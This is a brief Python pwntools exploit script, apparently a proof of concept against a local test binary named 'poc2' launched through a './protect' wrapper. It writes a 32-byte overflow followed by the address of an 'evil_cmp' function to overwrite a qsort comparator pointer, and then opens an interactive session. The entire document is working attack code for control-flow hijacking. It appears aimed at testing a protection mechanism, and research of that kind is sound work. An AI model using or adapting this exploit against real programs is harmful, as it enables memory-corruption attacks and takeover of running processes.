from pwn import *


context.binary = e = ELF("./poc2", checksec=False)

r = process(["/bin/bash", "./protect", "poc2"])
payload = b"A" * 32 + p64(e.sym["evil_cmp"])

r.recvuntil(b"poc2: overwrite qsort comparator:\n")
r.send(payload)
r.interactive()
